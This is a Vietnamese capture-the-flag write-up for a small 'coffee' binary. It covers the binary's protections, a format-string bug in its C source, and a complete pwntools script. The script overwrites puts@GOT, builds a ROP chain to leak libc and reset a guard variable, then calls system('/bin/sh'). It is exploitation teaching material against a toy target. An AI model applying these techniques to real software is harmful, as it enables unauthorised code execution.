# Coffee
/*
cre: https://ptr-yudai.hatenablog.com/entry/2021/10/03/225325
*/

# Reverse

file 64bit, dynamic linked và not stripped

```sh
coffee: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=f06390409bc7bfd78cb08726dd89b4cd04d38f1a, for GNU/Linux 3.2.0, not stripped
```
checksec
```sh
Arch:     amd64-64-little
RELRO:    Partial RELRO
Stack:    Canary found
NX:       NX enabled
PIE:      No PIE (0x400000)
```

Source code

```c
#include <stdio.h>

int x = 0xc0ffee;
int main(void) {
    char buf[160];
    scanf("%159s", buf);
    if (x == 0xc0ffee) {
        printf(buf);
        x = 0;
    }
    puts("bye");
}
```

## Tìm lỗi

Lỗi format string bên trong hàm if(), nhưng có 1 biến X nằm ở phân vùng BSS sẽ cản trở việc khai thác lỗi. 

# Exploit

### Khi hàm puts thực thi nó sẽ sử dụng 1 số khung trên stack, kết hợp lỗi FS, để thay đổi giá trị trong puts_got.

Tìm gadget cho việc thực thi ROP và leak libc. Mở trong IDA sẽ thấy gadget này
```sh
.text:000000000040128A                 pop     rbx
.text:000000000040128B                 pop     rbp
.text:000000000040128C                 pop     r12
.text:000000000040128E                 pop     r13
.text:0000000000401290                 pop     r14
.text:0000000000401292                 pop     r15
.text:0000000000401294                 retn
```
rop_pop_rdi_ret, ret,...

Sau khi leak libc thì việc tiếp theo là phải gán lại cho biến X = 0xc0ffee, thực hiện chung trong phần ROP lần này luôn.

Gadget cần cho việc này là gadget
`0x40117c (__do_global_dtors_aux+28) ◂— add    dword ptr [rbp - 0x3d], ebx` 
nằm ở __do_global_dtors_aux+28. 

Sắp xếp thì rbp = địa chỉ biến X + 0x3d, ebx = 0xc0ffee.

## file exploit

```sh
from pwn import * 
s = process(["stdbuf", "-i0", "-o0", "./coffee"])
elf = ELF("./coffee")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
raw_input("debug")

n = 6
got_puts = elf.got.puts
main = elf.symbols.main
got_print = elf.got.printf

rop_pop_rdi = 0x00401293
rop_pop_rbx_rbp_r12_r13_r14_r15 = 0x40128a
rop_add_prbpM3Dh_ebx = 0x0040117c

payload = '%' + str(0x128a) + "d%10$hn"
payload = payload.ljust(32,"\x00")
payload += p64(got_puts)
payload += p64(rop_pop_rdi+1) #ret
payload += p64(rop_pop_rdi)
payload += p64(elf.got['printf'])
payload += p64(elf.plt['printf'])
payload += p64(rop_pop_rbx_rbp_r12_r13_r14_r15)
payload += p64(0xc0ffee)
payload += p64(0x404048+0x3d)
payload += p64(2)
payload += p64(3)
payload += p64(4)
payload += p64(5)
payload += p64(rop_add_prbpM3Dh_ebx)
payload += p64(rop_pop_rdi+1)
payload += p64(elf.sym.main)


s.sendline(payload)
s.recvuntil("1")
leak = s.recv()
printf_leak = u64(leak.ljust(8,"\x00"))
libc.address = printf_leak - libc.symbols['printf']
system =  libc.symbols['system']
binsh = next(libc.search("/bin/sh"))
print ">  " + hex(printf_leak)
print "libc>  " + hex(libc.address)

payload2 = "A" * 40
payload2 += p64(rop_pop_rdi+1)
payload2 += p64(rop_pop_rdi)
payload2 += p64(binsh)
payload2 += p64(system)

s.sendline(payload2)

s.interactive()


``` 
